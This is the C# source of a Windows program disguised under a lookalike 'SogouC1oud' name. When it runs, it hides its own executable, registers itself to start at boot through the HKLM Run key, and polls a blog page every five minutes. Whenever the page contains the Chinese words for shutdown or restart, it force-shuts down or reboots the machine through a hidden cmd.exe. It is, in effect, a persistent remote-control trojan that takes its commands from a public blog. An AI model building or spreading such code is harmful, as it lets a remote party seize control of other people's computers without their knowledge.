using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.IO.Compression;
using System.Text.RegularExpressions;
using System.Diagnostics;
using Microsoft.Win32;

namespace SogouC1oud
{
    public partial class SogouC1oud : Form
    {
        public SogouC1oud()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //文件路径
            string fileUrl = Application.StartupPath + @"\SogouC1oud.exe";
            //隐藏文件
            HiddenFile(fileUrl);
            //修改注册表开机启动
            SetAutoRun(fileUrl, true);
            //扫描间隔
            TickScanning(5);
        }

        #region 定时扫描
        /// <summary>
        /// 
        /// </summary>
        /// <param name="nimute">时间间隔【单位:分钟】</param>
        public void TickScanning(int nimute)
        {
            //命令格式 “关机”
            int wait = 1000 * 60 * nimute;                 //五分钟执行一次
            string url = "http://www.cnblogs.com/oiliu/";  //配置自己的博客园地址
            //string timereg = @"\d{4}-\d{2}-\d{2} \d{2}:\d{2}";//匹配时间的正则
            while (true)
            {
                string html = getPageInfo(url);
                #region 关机命令
                Regex r = new Regex(@"关机");
                MatchCollection mc;
                mc = r.Matches(html);//匹配“关机”命令

                if (mc.Count > 0)//如果匹配上了，肯定取最上面一个关机命令的位置
                {
                    string tmp = mc[0].Value;
                    tmp = html.Substring(mc[0].Index, 22);//获取关机命令后的100个字符，里面包含了这篇随笔发表的时间
                    tmp = tmp.Replace("&nbsp;", " ");
                    DateTime dt = Convert.ToDateTime(tmp.Split('|')[1]);
                    DateTime now = DateTime.Now;
                    if (abs(DateDiff("tms", now, dt)) < 2 * wait)//如果是最近10分钟发出的命令，执行
                    {
                        //Console.Write("shutdown");
                        //Cmd("shutdown -s -f -t 0");
                    }
                    Cmd("shutdown -s -f -t 0");
                }
                #endregion
                #region 重启命令
                Regex r2 = new Regex(@"重启");
                MatchCollection mc2;
                mc2 = r2.Matches(html);//匹配“关机”命令

                if (mc2.Count > 0)//如果匹配上了，肯定取最上面一个关机命令的位置
                {
                    Cmd("shutdown -r -f -t 0");
                }
                #endregion
                System.Threading.Thread.Sleep(wait);
            }
        }
        #endregion

        #region 请求URL
        /// <summary>
        /// 请求Url并获取返回值
        /// </summary>
        /// <param name="strUrl">Url地址</param>
        /// <returns></returns>
        public static string getPageInfo(string strUrl)
        {
            WebClient wc = new WebClient(); // 创建WebClient实例提供向URI 标识的资源发送数据和从URI 标识的资源接收数据
            wc.Credentials = CredentialCache.DefaultCredentials; // 获取或设置用于对向 Internet 资源的请求进行身份验证的网络凭据。

            ///方法一：
            Encoding enc = Encoding.GetEncoding("utf-8"); // 如果是乱码就改成 utf-8 / GB2312
            string shtml = "";
            try
            {
                Byte[] pageData = wc.DownloadData(strUrl); // 从资源下载数据并返回字节数组。
                shtml = enc.GetString(pageData);
            }
            catch (Exception)
            {
                //Byte[] pageData = wc.DownloadData("http://oiliu.github.io/s.htm"); // 从资源下载数据并返回字节数组。
                //shtml = enc.GetString(pageData);
            }
            return shtml;
        }

        /// <summary>   
        /// 返回两个日期之间的时间间隔（y：年份间隔、M：月份间隔、【d：天数间隔、h：小时间隔、m：分钟间隔、s：秒钟间隔、ms：微秒间隔,中括号内前加t,表示总数,如td,总天数】）   
        /// </summary>   
        /// <param name="Interval">间隔标志</param> 
        /// <param name="Date1">开始日期</param>   
        /// <param name="Date2">结束日期</param>             
        /// <returns>返回间隔标志指定的时间间隔</returns>   
        public static double DateDiff(string Interval, System.DateTime? Date1, System.DateTime? Date2)
        {
            double dblYearLen = 365;//年的长度，365天   
            double dblMonthLen = (365 / 12);//每个月平均的天数   
            System.TimeSpan objT;
            DateTime d1 = new DateTime();
            DateTime d2 = new DateTime();
            if (Date1 == null) return 0;
            if (Date2 == null) return 0;

            d1 = (DateTime)Date1;
            d2 = (DateTime)Date2;

            objT = d2.Subtract(d1);
            switch (Interval)
            {
                case "y"://返回日期的年份间隔   
                    return (double)System.Convert.ToInt32(objT.Days / dblYearLen);
                case "M"://返回日期的月份间隔   
                    return (double)System.Convert.ToInt32(objT.Days / dblMonthLen);
                case "d"://返回日期的天数间隔  
                    objT = Convert.ToDateTime(d2.ToShortDateString()).Subtract(Convert.ToDateTime(d1.ToShortDateString()));
                    return (double)objT.Days;
                case "h"://返回日期的小时间隔   
                    return (double)objT.Hours;
                case "m"://返回日期的分钟间隔   
                    return (double)objT.Minutes;
                case "s"://返回日期的秒钟间隔   
                    return (double)objT.Seconds;
                case "ms"://返回时间的微秒间隔   
                    return (double)objT.Milliseconds;
                case "td"://总天
                    return objT.TotalDays;
                case "th"://总小时数
                    return objT.TotalHours;
                case "tm"://总分钟
                    return objT.TotalMinutes;
                case "ts"://总秒
                    return objT.TotalSeconds;
                case "tms"://总毫秒
                    return objT.TotalMilliseconds;
                default:
                    break;
            }
            return 0;
        }
        /// <summary>
        /// 执行命令行
        /// </summary>
        /// <param name="cmd"></param>
        /// <returns></returns>
        public static string Cmd(string command)
        {
            string output = ""; //输出字符串  
            if (command != null && !command.Equals(""))
            {
                Process process = new Process();//创建进程对象  
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";//设定需要执行的命令  
                startInfo.Arguments = "/C " + command;//“/C”表示执行完命令后马上退出  
                startInfo.UseShellExecute = false;//不使用系统外壳程序启动  
                startInfo.RedirectStandardInput = false;//不重定向输入  
                startInfo.RedirectStandardOutput = true; //重定向输出  
                startInfo.CreateNoWindow = true;//不创建窗口  
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())//开始进程  
                    {
                        process.WaitForExit();//这里无限等待进程结束  
                        output = process.StandardOutput.ReadToEnd();//读取进程的输出  
                    }
                }
                catch
                {
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
            }
            return output;
        }

        public static double abs(double d)
        {
            return d > 0 ? d : -d;
        }
        #endregion

        #region 开机启动
        /// <summary>
        /// 设置应用程序开机自动运行
        /// </summary>
        /// <param name="fileName">应用程序的文件名</param>
        /// <param name="isAutoRun">是否自动运行，为false时，取消自动运行</param>
        /// <exception cref="System.Exception">设置不成功时抛出异常</exception>
        public static void SetAutoRun(string fileName, bool isAutoRun)
        {
            RegistryKey reg = null;
            try
            {
                if (!System.IO.File.Exists(fileName))
                    throw new Exception("该文件不存在!");
                String name = fileName.Substring(fileName.LastIndexOf(@"\") + 1);
                reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                if (reg == null)
                    reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                if (isAutoRun)
                    reg.SetValue(name, fileName);
                else
                    reg.SetValue(name, false);
            }
            catch (Exception ex)
            {
                throw new Exception(ex.ToString());
            }
            finally
            {
                if (reg != null)
                    reg.Close();
            }

        }
        #endregion

        #region 设置文件隐藏
        public void HiddenFile(string fileUrl)
        {
            FileInfo fi = new FileInfo(fileUrl);
            //fi.Attributes = fi.Attributes | FileAttributes.ReadOnly | FileAttributes.Hidden; // 法一
            fi.Attributes = fi.Attributes | FileAttributes.ReadOnly | FileAttributes.Hidden;
            //File.SetAttributes("C:\\test.txt", fi.Attributes | FileAttributes.ReadOnly | FileAttributes.Hidden); // 法二
        }
        #endregion
    }
}